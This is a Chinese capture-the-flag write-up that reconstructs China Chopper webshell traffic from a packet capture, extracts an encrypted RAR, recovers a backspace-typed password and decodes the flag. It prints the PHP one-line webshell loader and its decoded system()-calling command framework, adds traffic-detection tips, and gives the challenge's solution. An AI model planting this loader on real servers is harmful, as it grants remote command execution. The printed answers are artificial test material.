# 菜刀流量 · Writeup（复盘版）

> 题目：MISC / Medium
> 附件：`8c67279ecf25e04b1664f10b30e792c0fb022b83b6932584c26af828e44be33e.PCAPNG`（90,448 B / 499 帧 / 49 秒）
> 考点：pcapng 解析 → 中国菜刀 webshell 流量 → 终端退格还原口令 → RAR5 解密 → HTML 实体解码
> **flag：`flag{306bd05d78ccb90d2a442539d70ce4c2}`**

---

## 一、题目与判定条件

抓包来自一台 Windows 10 主机（`LAPTOP-3DCRRASA`，Dumpcap 3.0.5，以太网链路），时间是 2019-09-26 11:46:43 ~ 11:47:30 UTC。

判定条件很简单：**从流量里找出攻击者拿到的 flag**。所以整道题的主线是"找异常流量 → 还原攻击链 → 拿到被偷的文件 → 破开口令"。

| 项目 | 值 |
|---|---|
| 攻击者/受害内网主机 | `192.168.31.141`（网关 `192.168.31.1`） |
| 被控服务器 | `139.224.112.182:8801` |
| webshell 路径 | `/admin/upload/1569496537.php` |
| 服务器环境 | Apache 2.4.7 / PHP 5.5.9-1ubuntu4.25 / Linux 容器 `25c9dc316909`，运行用户 `www-data` |

---

## 二、全局侦察：把 499 帧砍到 16 帧

第一步不要盯着包列表硬看，先看分布（`统计 → 协议分级` / `统计 → 会话`）。

| 流量 | 帧数 | 判定 |
|---|---|---|
| TCP `139.224.112.182:8801` | **76** | **主线，唯一有业务 payload 的外部服务** |
| UDP `192.168.31.1:32522 → 239.255.255.250:1900` | 44 | SSDP / UPnP 广播（小米路由器），噪音 |
| UDP `54915 → 192.168.31.255` | 50 | 局域网发现广播，噪音 |
| UDP `443 → 172.217.24.14`（QUIC）、TCP 442/5228 | 十几帧 | Google 系正常流量，噪音 |
| UDP `53 → 8.8.8.8` | 6 | 正常 DNS |

一条 `ip.addr == 139.224.112.182` 就把范围压到 76 帧，再加 `http` 只剩 16 帧（8 请求 + 8 响应）。

**结论：这是一次针对单个 Web 服务的入侵，与时间戳、主机名、DNS 无关。**

---

## 三、认出"中国菜刀"

### 3.1 请求特征

```
POST /admin//upload/1569496537.php HTTP/1.1
User-Agent: Java/1.8.0_211
Content-type: application/x-www-form-urlencoded
Content-Length: 674

a=@eval\x01(base64_decode($_POST[action]));&action=<base64>&z1=<base64>&z2=<base64>
```

三个关键特征，命中任意一个就能定性：

1. **`a=@eval(base64_decode($_POST[...]))`** —— PHP 一句话木马的经典 loader；
2. **`User-Agent: Java/1.8.0_211`** —— 菜刀/蚁剑用 Java 写的 HTTP 客户端，正常浏览器不会这样；
3. **URL 里出现 `/upload/1569496537.php`** —— 上传目录里的可疑文件。

### 3.2 响应特征

响应体被一对标记夹住：

```
->|<真正的回显>|<-
```

这是菜刀用来切分"命令回显"的分隔符（蚁剑默认会换，本题是菜刀原味）。命令回显内部还有 `[S]` / `[E]` 两个标记，用来标记工作目录输出段的开始与结束：

```
->|1569496537.php
flag.rar
password.txt
[S]
/var/www/html/admin/upload
[E]
|<-
```

### 3.3 三个参数各是干什么的

| 参数 | base64 解码后 | 作用 |
|---|---|---|
| `action` | 一段 PHP（`ini_set` / `set_time_limit` / `system(...)`） | "执行框架"，负责拼命令、调 `system`、输出 `->|` 包裹的结果 |
| `z1` | `/bin/sh` | shell 解释器 |
| `z2` | 真正的命令，如 `cat flag.rar` | 要执行的 shell 命令 |

解码 `action` 得到的关键片段：

```php
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
echo("->|");;
$p=base64_decode($_POST["z1"]);
$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
$r="{$p} {$c}";
@system($r." 2>&1",$ret);
print ($ret!=0)?"\nret={$ret}\n":"";
echo("|<-");die();
```

### 3.4 一个刻意的干扰

请求体第 8 个字节（`@eval` 和 `(` 之间）插了一个 **`0x01`**：

```
61 3d 40 65 76 61 6c 01 28    a = @ e v a l \x01 (
```

正常菜刀是 `@eval(base64_decode(...))`，这里多了个不可打印字节。影响两件事：

- 手工复现请求时，直接抄会解析失败；
- 但 **PHP 的 `@eval\x01(...)` 依然是合法表达式**（`\x01` 被当作空白跳过），所以服务端照常执行 —— 说明这是出题人往流量里加的"指纹"，不是攻击失败。

---

## 四、还原完整攻击链（8 轮交互）

5 条 TCP 连接、8 个 HTTP 事务，全部来自同一个菜刀客户端：

| # | tcp.stream | 客户端端口 | 请求帧 | 响应帧 | 请求体 | 响应体 | 命令 |
|---|---|---|---|---|---|---|---|
| 1 | 2 | 5482 | 46 | 49 | 674 B | 131 B | 连接测试（目录 + `uname -a` + 当前用户） |
| 2 | 2 | 5482 | 58 | 60 | 602 B | 78 B | `cd "/var/www/html/admin/upload/";ls` |
| 3 | 2 | 5482 | 69 | 71 | 606 B | 231 B | `...;ls -l` |
| 4 | 5 | 5490 | 96 | **99** | 618 B | **475 B** | `...;cat flag.rar` |
| 5 | 8 | 5498 | 128 | 131 | 622 B | 62 B | `...;cat password.txt` |
| 6 | 12 | 5506 | 190 | 193 | 606 B | 34 B | `...;cd ..` |
| 7 | 12 | 5506 | 252 | 255 | 592 B | 95 B | `cd "/var/www/html/admin/";ls` |
| 8 | 17 | 5512 | 442 | 456 | 596 B | 6 B | `cd "/var/www/html/admin/";exit` |

> 帧号与 `文件 → 导出对象 → HTTP` 列表里的"分组"号完全一致，可直接对照。

### 4.1 回显逐条解读

```
#1  /var/www/html/admin/upload  \t  Linux 25c9dc316909 4.4.0-146-generic #172-Ubuntu ...(www-data)
#2  1569496537.php / flag.rar / password.txt
#3  total 12
    -rw-r--r-- 1 www-data www-data  28 1569496537.php
    -rw-r--r-- 1 www-data www-data 434 11:27 flag.rar
    -rw-r--r-- 1 www-data www-data  21 11:16 password.txt
#4  Rar!\x1a\x07\x01\x00 ... （434 字节，RAR5）
#5  SuperHer0␡␡␡␡Masters␡
#6  （空，只有 [S]/[E]）
#7  footer.php header.php index.php logout.php upload upload.php
#8  ->||<-
```

**攻击者其实已经替我们把活干完了**：`cat flag.rar` 把整个压缩包吐到 HTTP 响应里，`cat password.txt` 把口令文件也吐了出来。剩下的是本地离线工作。

三条互相印证的线索：

- `ls -l` 显示 `flag.rar` **434 字节** / `password.txt` **21 字节**；
- `cat` 出来的字节数与之**完全一致**（响应体去掉 `->|`、`[S]…[E]`、`|<-` 后正好 434 / 21）；
- 所以流量没截断、没丢包，还原是完整的。

---

## 五、取出 `flag.rar`

### 5.1 响应体结构

`cat flag.rar` 的响应头是 `Content-Length: 475`，body 的构成为：

```
"->|"  +  RAR(434 B)  +  "[S]\n/var/www/html/admin/upload\n[E]\n" + "|<-"
 3     +     434      +                    35                      +  3    = 475 ✓
```

长度自洽，说明这 434 字节是完整的文件内容。

### 5.2 定位

Wireshark 过滤器（比记帧号可靠）：

```
http.content_length == 475
```

或

```
frame.number == 99
tcp.stream eq 5
```

### 5.3 导出

任选一种，产物只是"前面多几个字节"的区别：

| 方式 | 路径 | 产物 |
|---|---|---|
| 导出对象 | `文件 → 导出对象 → HTTP` | 475 B（纯 body） |
| 导出分组字节流 | `文件 → 导出分组字节流`（Ctrl+Shift+X） | 778 B（整个以太网帧） |
| 追踪流另存 | 右键 → `追踪流 → HTTP 流` → `另存为` | 1601 B（双向会话） |

> **关键认知**：这三条路都在做"字节级复制"。而 `追踪流` 窗口里 **ASCII 视图下复制粘贴** 得到的只是文本 —— 所有不可打印字节被替换成 `.`（0x2E），这是**多对一的有损映射**，不可逆，粘到记事本再存成 `.rar` 必然坏。必须用上述导出方式，或者 `复制 → ...as a Hex Dump`。

### 5.4 434 还是 217？

RAR 内部出现了**两个 `Rar!` 签名**，第二个在偏移 **217**：

```
$ python -c "d=open('flag.rar','rb').read(); print([i for i in range(len(d)) if d.startswith(b'Rar!',i)])"
[0, 217]
$ d[0:217] == d[217:434]
True
```

服务器上的 `flag.rar` 就是 **217 字节的归档写了两遍**。RAR5 解析到 end-of-archive 块（`03 05 04 00`）就结束，多余数据被忽略，所以：

- **精确长度**：217 字节；
- 但取 434 字节也能正常打开（RAR 读到 end block 就停）。

结构逐块拆解（217 字节版）：

| 偏移 | 长度 | 块 | 内容 |
|---|---|---|---|
| 0x00 | 8 | 签名 | `52 61 72 21 1A 07 01 00`（RAR5） |
| 0x08 | 15 | 主头 | CRC32 + hsize=10 + type=1 |
| 0x17 | 90 | 文件头 | CRC32 + hsize=0x55 + type=2 + **extra area 60 B（加密记录）** |
| 0x71 | 96 | 数据 | 加密后的 `flag.txt` 内容 |
| 0xD1 | 8 | 结束块 | `… 03 05 04 00` |

文件头解出的元数据：

```
name        = flag.txt
unpacked    = 200 字节
packed      = 96 字节
method      = 3（普通压缩）, 字典 128 KB
data CRC32  = 0x8f204e61
```

**结论：压缩 + 加密（RAR5 AES-256），必须先拿到口令。**

---

## 六、口令：`0x7F` 就是退格

### 6.1 原始 21 字节

```
53 75 70 65 72 48 65 72 30 7F 7F 7F 7F 4D 61 73 74 65 72 73 7F
S  u  p  e  r  H  e  r  0  ␡  ␡  ␡  ␡  M  a  s  t  e  r  s  ␡
```

对应 ASCII 视图：

```
SuperHer0....Masters.
```

**四个点看着像乱码，其实是 4 个 0x7F。** 只有切到「十六进制转储」视图才看得见。

### 6.2 语义还原

`0x7F` = ASCII **DEL**，在终端/键盘上就是 **Backspace（退格）**。把这段当成"某人在终端里敲口令的按键记录"：

```
SuperHer0   (9 字符)
⌫⌫⌫⌫       退 4 格 → 删掉 "Her0" → 剩 "Super"  (5 字符)
Masters     (7 字符)
⌫          退 1 格 → 删掉 "s"    → 剩 "Master" (6 字符)

Super + Master = SuperMaster   (11 字符)
```

出题人算得很准：4 个退格对应 `SuperHer0` 里多出的 `H e r 0`，1 个退格对应 `Masters` 末尾的 `s`，删完正好不剩。

### 6.3 四个候选的实测结果

| 候选 | 结果 |
|---|---|
| `SuperHer0\u007f\u007f\u007f\u007fMasters\u007f`（原样 21 字节） | ❌ Invalid Password |
| `SuperHer0Masters`（只删 DEL，不做退格） | ❌ Invalid Password |
| `Super`（只保留前半段） | ❌ Invalid Password |
| **`SuperMaster`** | ✅ 通过 |

这张表说明："退格语义"不是脑补，是唯一能让包开口的读法。

### 6.4 为什么出题人这么设计

考点不是密码本身，而是**"你愿不愿意去看原始字节"**：

- ASCII 视图 → 看到 `SuperHer0....Masters.` → 以为是乱码，去爆破；
- Hex 视图 → 看到 `7f` → 想起 DEL/退格 → 秒解。

这道题把"看 hex"从习惯变成了必要条件。

---

## 七、解密解压

### 7.1 RAR5 加密参数（从 extra area 解出）

```
加密记录: version=0  flags=0x3  lg2count=15
迭代次数: 2^15 = 32768
salt    = 8148a599b95cd9b4a55068b8a6f9e9e0
iv      = 954f0d3c04adf80ab28b79843df43cb1
check   = 794281d185aea9da      (8 B，用于快速验证口令)
加密算法: AES-256-CBC
KDF     : PBKDF2-HMAC-SHA256
```

`check` 字段的意义：解压软件不必解整块数据就能判断口令对不对，这也是"输错密码瞬间报错"的原因。

### 7.2 正常解压

```
Bandizip / WinRAR / 7-Zip 19.00+ 打开 → 输入 SuperMaster → 提取 flag.txt
```

> **注意**：Windows 自带的 `tar.exe`（libarchive）不支持 RAR5 解密，会直接失败；必须用 7-Zip 19.00 以上或 WinRAR 5.x 以上 / Bandizip。

### 7.3 一个省事的小发现

实测：**Bandizip 能自动跳过 RAR 签名前的垃圾字节**。所以：

- 导出的 475 字节 body 不改名、不截断，直接丢给 Bandizip 也能识别出 `Rar5 / flag.txt`；
- 778 字节的整帧同样可以。

也就是说"截出 217 字节"不是必须步骤，只在用严格校验的工具时才需要。

---

## 八、解 HTML 实体

`flag.txt`（200 字节）内容：

```
&#102;&#108;&#97;&#103;&#123;&#51;&#48;&#54;&#98;&#100;&#48;&#53;&#100;&#55;&#56;
&#99;&#99;&#98;&#57;&#48;&#100;&#50;&#97;&#52;&#52;&#50;&#53;&#51;&#57;&#100;&#55;
&#48;&#99;&#101;&#52;&#99;&#50;&#125;
```

这是 **HTML 十进制字符引用**，`&#102;` = `f`，`&#123;` = `{`。三种解法：

| 方法 | 操作 | 说明 |
|---|---|---|
| **浏览器（零工具）** | 改名 `flag.html` → 双击 | 浏览器自动解码实体，直接显示明文 |
| CyberChef | `From HTML Entity` | 图形化 |
| Python | `html.unescape(...)` | 一行 |

结果：

```
flag{306bd05d78ccb90d2a442539d70ce4c2}
```

---

## 九、纯 GUI 复现路线（无脚本）

```
① Wireshark 打开 pcapng
   → 过滤器 ip.addr == 139.224.112.182
   → 右键任一包 → 追踪流 → HTTP 流，确认是菜刀流量

② 文件 → 导出对象 → HTTP
   → 选 475 bytes 那一行（text/html）
   → 保存为 obj475.bin

③ 改名 obj475.bin → flag.rar，双击用 Bandizip 打开
   （Bandizip 会自动跳过开头的 "->|" 三个字节，直接认成 Rar5）
   → 看到 flag.txt 200 字节

④ 选中 flag.txt → 解压 → 密码 SuperMaster → 确定

⑤ flag.txt 改名 flag.html → 双击用浏览器打开
   → flag{306bd05d78ccb90d2a442539d70ce4c2}
```

全程零命令行。

---

## 十、脚本复现路线（可验证）

```powershell
# 1) 直接从 pcapng 切出 RAR（475 B body 装在单个 TCP 段里，二进制在文件中连续）
python -c "d=open('challenge.pcapng','rb').read();i=d.find(b'Rar!\x1a\x07\x01\x00');open('flag.rar','wb').write(d[i:i+217])"

# 2) 解压
& "C:\Program Files\Bandizip\bz.exe" x -p:SuperMaster -o:out -y flag.rar

# 3) 解 HTML 实体
python -c "import html;print(html.unescape(open('out/flag.txt').read()))"
```

配套脚本（本目录）：

| 脚本 | 作用 |
|---|---|
| `overview.py` | 协议/端口/会话统计，砍噪音 |
| `allcmds.py` | 提取所有 `z2` 并 base64 解码，还原攻击链 |
| `extract_rar.py` | 按 TCP 序号重组流，切出 RAR |
| `cut_rar.py` | 从任意导出物（475/778/1601 B）自动定位并切出 RAR |
| `rar5_enc.py` | 解析 RAR5 加密记录（salt/iv/check/lg2count） |
| `wireshark_guide.py` | 输出过滤器命中数与导出对象对照表 |

---

## 十一、踩坑清单（复盘重点）

| # | 坑 | 现象 | 正解 |
|---|---|---|---|
| 1 | 把 ASCII 视图当原文 | 复制粘贴后存 `.rar`，解压报"不是压缩文件" | 不可打印字节已被替换成 `.`，必须走导出/Hex Dump |
| 2 | 在追踪流窗口直接复制 | 同上 | 追踪流另存要先把 `显示数据` 切 `原始数据` |
| 3 | 找"导出分组字节流"找不到 | 菜单项灰色 | 该项依赖包列表 selection；关掉悬浮窗口、重新点选包、用 Ctrl+Shift+X |
| 4 | 只按 434 字节截取 | 以为文件坏了 | 真实归档 217 B，重复了两遍；RAR 到 end block 就停 |
| 5 | `password.txt` 原样当密码 | Invalid Password | `0x7F` 是退格，要做退格栈还原 |
| 6 | 删掉 0x7F 当密码 | Invalid Password | 删 DEL ≠ 退格效果，`SuperHer0Masters` 仍错 |
| 7 | 用 `tar.exe` 解 | 不支持 RAR5 | 用 7-Zip 19.00+ / WinRAR 5.x+ / Bandizip |
| 8 | 只搜 `POST` 就收工 | 找不到文件 | **命令在 POST 里，文件在 Response 里** |
| 9 | 忽略 `0x01` 脏字节 | 手工重放失败 | `@eval\x01(` 被 PHP 当空白忽略，是故意指纹 |
| 10 | 7-Zip 列表显示 `Encrypted = -` | 误判未加密 | 应以"能否用口令解开"为准 |

---

## 十二、知识点沉淀

### 12.1 菜刀 / 蚁剑流量识别速查

| 特征 | 说明 |
|---|---|
| POST 体 | `参数名=@eval(base64_decode($_POST[另一参数名]));` |
| 分隔符 | 回显被 `->|` … `|<-` 包裹 |
| 参数分工 | 一个传 PHP 框架代码，一个传 `/bin/sh`，一个传 base64 命令 |
| UA | `Java/1.x.x` —— Java 写的 HTTP 客户端，正常浏览器不会这样 |
| 编码 | 命令 base64；冰蝎那类会再套一层 AES |

三者同源（蚁剑 / 冰蝎都是菜刀演化），共性就是"**POST 里塞代码，回显里带分隔符**"。看到 `@eval` + `base64_decode($_POST[...])` + `Java/1.x` 这个组合，基本可以直接定性。

### 12.2 三条通用经验

1. **先砍噪音再细看**：协议分级 → 会话按字节排序 → 锁定唯一异常端点，比逐包翻快十倍。
2. **请求看"人做了什么"，响应看"拿到了什么"**：本题 flag 在两个 response body 里，只盯 request 会空手。
3. **二进制永远走字节通道**：导出对象 / 导出分组字节流 / Hex Dump；任何经过"文本视图复制"的路径都会损坏。

### 12.3 一套可复用的 pcap 取证流程

```
1. 统计 → 协议分级        有哪些协议，谁占比异常
2. 统计 → 会话            按字节数排序，锁定异常端点
3. 显示过滤器            收窄到 IP / 端口 / 协议
4. 追踪流                看双向对话，切 Hex 看二进制
5. 导出对象 / 导出字节流  把 payload 落成文件
6. 文件头识别            52 61 72 21=Rar! / 50 4B=zip / 89 50 4E 47=png / 1F 8B=gzip
7. 结构解析              按格式规范拆块，算 CRC、找结束标记
```

常用过滤器：

```
ip.addr == 139.224.112.182
tcp.stream eq 5
http.request.method == "POST"
http.content_length == 475
frame contains "Rar!"
http contains "flag"
```

---

## 十三、时间线

| 相对时间(s) | 事件 |
|---|---|
| 0 | 抓包开始；SSDP 广播、Google QUIC/DNS 等背景流量 |
| 4.04 | #1 连接测试：确认 `/var/www/html/admin/upload`、`uname -a`、`www-data` |
| 5.86 | #2 `ls` → 发现 `flag.rar`、`password.txt`（78 B 回显） |
| 9.57 | #3 `ls -l` → 确认 434 B / 21 B（231 B 回显） |
| 14.63 | 连接 5482 关闭 |
| 18.98 | 新连接 5490 建立 |
| **19.03 → 19.07** | **#4 `cat flag.rar` → 475 B 响应，RAR 落地** |
| 24.14 | 连接 5490 关闭 |
| 28.90 | #5 `cat password.txt` → 21 B，口令曝光 |
| 39.04 | #6 `cd ..`（34 B 空回显） |
| 41.00 | #7 `ls /var/www/html/admin`（95 B） |
| 46.37 | #8 `exit`（6 B 空回显），会话结束 |
| 49.01 | 抓包结束 |

---

## 附：核心结论一页纸

```
流量 → 中国菜刀 webshell（139.224.112.182:8801, /admin/upload/1569496537.php）
     → 攻击者 cat 了两个文件：
          flag.rar      434 B（= 217 B 的 RAR5 写了两遍，内含加密的 flag.txt 200 B）
          password.txt   21 B（SuperHer0 + 4×0x7F + Masters + 1×0x7F）
     → 0x7F = 退格 → 口令 SuperMaster
     → 解压 → flag.txt（HTML 十进制实体）→ 浏览器打开
     → flag{306bd05d78ccb90d2a442539d70ce4c2}
```
